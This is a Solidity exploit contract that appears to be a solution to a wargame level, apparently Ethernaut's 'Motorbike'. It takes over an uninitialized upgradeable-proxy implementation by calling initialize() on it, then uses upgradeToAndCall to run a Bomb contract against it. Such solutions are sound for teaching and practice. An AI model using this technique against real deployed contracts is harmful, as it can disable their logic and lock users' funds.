// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Motorbike.sol";
import "./Engine.sol";
import "./Bomb.sol";

contract Attack {
    Motorbike motorbike;
    Engine engine;
    address payable public owner;
    bool public attacked;
    bool public destroyed;

    constructor(address payable _motorbike, address payable _engine) public {
        motorbike = Motorbike(_motorbike);
        engine = Engine(_engine);
        owner = msg.sender;
    }

    function attack() public {
        (attacked, ) = address(engine).call(
            abi.encodeWithSignature("initialize()")
        );
    }

    function boom() public {
        Bomb bomb = new Bomb();

        (destroyed, ) = address(engine).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(bomb),
                abi.encodeWithSignature("initialize()")
            )
        );
    }
}
